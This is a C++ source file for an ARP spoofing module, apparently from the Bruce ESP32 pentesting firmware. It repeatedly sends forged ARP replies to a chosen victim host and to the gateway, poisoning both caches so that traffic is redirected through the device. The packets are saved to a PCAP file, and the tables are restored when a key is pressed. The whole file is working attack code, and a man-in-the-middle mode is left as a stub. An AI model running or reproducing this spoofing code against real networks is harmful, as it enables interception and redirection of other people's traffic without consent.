/**
 * @file ARPSpoofer.cpp
 * @brief ARP Spoofer module for every esp-netif
 * @version 0.1
 * @date 2025-05-15
 */
#if !defined(LITE_VERSION)
#include "ARPSpoofer.h"
#include "Arduino.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/net_utils.h"
#include "core/utils.h"
#include "core/wifi/wifi_common.h"
#include "lwip/pbuf.h"
#include "lwipopts.h"
#include "modules/ethernet/eth_arp_utils.h"
#include "modules/wifi/scan_hosts.h"
#include <esp_wifi.h>
#include <globals.h>
#include <iomanip>
#include <iostream>
#include <lwip/dns.h>
#include <lwip/err.h>
#include <lwip/etharp.h>
#include <lwip/igmp.h>
#include <lwip/inet.h>
#include <lwip/init.h>
#include <lwip/ip_addr.h>
#include <lwip/mem.h>
#include <lwip/memp.h>
#include <lwip/netif.h>
#include <lwip/sockets.h>
#include <lwip/sys.h>
#include <lwip/timeouts.h>
#include <modules/wifi/sniffer.h> //use PCAP file saving functions
#include <sstream>

ARPSpoofer::ARPSpoofer(
    const Host &host, IPAddress gateway, uint8_t _gatewayMAC[6], uint8_t mac[6], bool _mitm
) {
    mitm = _mitm;
    memcpy(gatewayMAC, _gatewayMAC, 6);
    memcpy(mac, myMAC, 6);
    setup(host, gateway);
}

ARPSpoofer::~ARPSpoofer() {}

bool ARPSpoofer::arpPCAPfile() {
    uint16_t nf = 0;
    FS *fs;
    if (setupSdCard()) fs = &SD;
    else { fs = &LittleFS; }
    if (!fs->exists("/BrucePCAP")) fs->mkdir("/BrucePCAP");
    while (true) {
        String filename = "/BrucePCAP/ARP_session_" + String(nf) + ".pcap";
        if (fs->exists(filename.c_str())) {
            // Serial.println(filename);
            delay(1);
            nf++;
        } else break;
    }
    pcapFile = fs->open(String("/BrucePCAP/ARP_session_" + String(nf) + ".pcap").c_str(), FILE_WRITE);
    if (pcapFile) return true;
    else return false;
}

void ARPSpoofer::setup(const Host &host, IPAddress gateway) {
    if (!arpPCAPfile()) Serial.println("Fail creating ARP Pcap file");
    writeHeader(pcapFile); // write pcap header into the file

    for (int i = 0; i < 4; i++) victimIP[i] = host.ip[i];
    stringToMAC(host.mac.c_str(), victimMAC);

    // TODO: Use toBytes helper
    for (int i = 0; i < 4; i++) gatewayIP[i] = gateway[i];

    drawMainBorderWithTitle("ARP Spoofing");
    padprintln("");
    padprintln("Single Target Attack.");

    if (mitm) {
        tft.setTextSize(FP);
        // padprintln("Man in The middle Activated");
        // padprintln("/BrucePCAP/ARP_session_" + String(nf) + ".pcap");
        Serial.println("Still in development");
    }
    padprintln("Tgt:" + host.mac);
    padprintln("Tgt: " + ipToString(victimIP));
    padprintln("GTW:" + macToString(gatewayMAC));
    padprintln("");
    padprintln("Press Any key to STOP.");

    loop();
}

void ARPSpoofer::loop() {
    long tmp = 0;
    int count = 0;
    while (!check(AnyKeyPress)) {
        if (tmp + 2000 < millis()) { // sends frames every 2 seconds
            // Sends false ARP response data to the victim (Gataway IP now sas our MAC Address)
            sendARPPacket(victimIP, victimMAC, gatewayIP, myMAC, pcapFile);

            // Sends false ARP response data to the Gateway (Victim IP now has our MAC Address)
            sendARPPacket(gatewayIP, gatewayMAC, victimIP, myMAC, pcapFile);
            tmp = millis();
            count++;
            tft.drawRightString("Spoofed " + String(count) + " times", tftWidth - 12, tftHeight - 16, 1);
        }
        vTaskDelay(pdMS_TO_TICKS(1));
    }

    if (mitm) {
        // Configures Promiscuous mode
        Serial.println("Promiscuous mode deactivated.");
    }

    // Restore ARP Table
    sendARPPacket(victimIP, victimMAC, gatewayIP, gatewayMAC, pcapFile);
    sendARPPacket(gatewayIP, gatewayMAC, victimIP, victimMAC, pcapFile);

    pcapFile.flush();
    pcapFile.close();
}

void ARPSpoofer::sendARPPacket(
    uint8_t *targetIP, uint8_t *targetMAC, uint8_t *spoofedIP, uint8_t *spoofedMAC, File pcapFile
) {
    ::sendARPPacket(targetIP, targetMAC, spoofedIP, spoofedMAC, pcapFile, "ARP Packet sent!");
}
#endif
